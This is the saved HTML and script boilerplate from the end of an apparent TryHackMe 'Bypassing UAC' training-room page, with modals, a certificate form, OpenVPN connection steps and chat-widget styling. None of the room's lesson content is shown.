<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Bypassing UAC_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/6243492e48d4c800497bc08c">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Bypassing UAC_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/bypassinguac#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/bypassinguac#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/bypassinguac#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/bypassinguac#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/bypassinguac#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Bypassing UAC_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Bypassing UAC_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Bypassing UAC_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Bypassing UAC_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Bypassing UAC_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Bypassing UAC_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/bypassinguac#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/bypassinguac#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Bypassing UAC_files/notify.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/api-requests.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/events.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/underscore-min.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Bypassing UAC_files/chart.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/expire.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/sockets.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/faqSearch.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/certificate.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/utils.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/confetti.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/videos.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/intro.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/prism.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/logic.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/tasks.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/connection-status.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/glossary.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "ChoyRt5D-YoEFam7chJoqk1kDOqRzv2-bGw4"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "bypassinguac"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="BE85A01E-D2A4-1072-6C19-EB095CBB7704"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Bypassing UAC_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Bypassing UAC_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>